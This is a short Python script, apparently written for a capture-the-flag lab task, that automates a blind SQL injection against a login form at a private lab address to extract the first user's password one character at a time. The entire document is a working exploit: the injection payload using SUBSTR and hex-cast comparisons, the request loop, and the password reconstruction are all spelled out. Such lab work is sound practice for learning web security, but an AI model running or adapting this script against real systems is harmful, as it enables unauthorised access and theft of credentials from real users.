#!/bin/env python3

"""
Script created to brute force SQLi Task 3 Blind Injection
"""

import requests
import string
import time
start = time.time()
def hexify():
    """Function: Convert ascii/numbers to hex """
    numbers = '0123456789'
    letters = string.ascii_letters+numbers
    hex_letters = []
    for l in letters:
        hex=(l).encode('utf-8').hex()
        hex_letters.append(hex)
    return hex_letters

def injectstuff(hexlist):
    """Perform SQL Injection and decode hex value to print flag"""
    session = requests.Session()
    url = 'http://10.10.211.149:5000/challenge3/login'
    i = 1
    flag = ''
    while i <= 40:
        for h in hexlist:
            request = session.post(url, data={'username':f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{i},1) = CAST(X'{h}' as Text) -- -",'password':'1234'})
            response = request.text
            if not 'Invalid' in response:
                print('Found a match!')
                # Decode hex to ascii
                decoded=(bytes.fromhex(h).decode('utf-8'))
                flag = flag+decoded
                print(flag)
                break
        i+=1
    print(f"Password Cracked: {flag}")


hexify()
injectstuff(hexify())
end = time.time()
print(end - start)
